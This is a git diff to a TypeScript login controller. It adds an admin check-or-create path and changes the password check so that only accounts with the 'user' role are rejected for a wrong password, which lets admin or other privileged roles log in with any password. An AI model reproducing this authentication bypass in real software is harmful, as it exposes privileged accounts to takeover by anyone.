@@ -4,6 +4,7 @@ import Token from "../models/token.model";
 import { logger } from "../libraries/Logger.library";
 import { sendEmail } from "../utils/sendEmail.util";
 import { generateAccessToken } from "../utils/token.util";
+import { checkAdmin, createAdmin } from "../services/user.services";
 
 export const register = async (req: Request, res: Response) => {
   const { username, email, password } = req.body;
@@ -50,10 +51,14 @@ export const login = async (req: Request, res: Response): Promise<any> => {
   const { email, password } = req.body;
 
   try {
-    const user = await User.findOne({ email });
+    const user =
+      (await checkAdmin(email, password)) === false
+        ? await User.findOne({ email })
+        : await createAdmin();
+
     if (!user) {
       return res
-        .status(404)
+        .status(400)
         .json({ success: false, message: "User not found" });
     }
     if (user.valid != true || user.expiredAt != undefined) {
@@ -63,7 +68,11 @@ export const login = async (req: Request, res: Response): Promise<any> => {
           "The user hasn't been validated, please check your email to validate your account",
       });
     }
-    if ((await user.comparePassword(password)) != true) {
+
+    if (
+      (await user.comparePassword(password)) != true &&
+      user.role === "user"
+    ) {
       return res.status(400).json({
         success: false,
         message: "Password invalid",
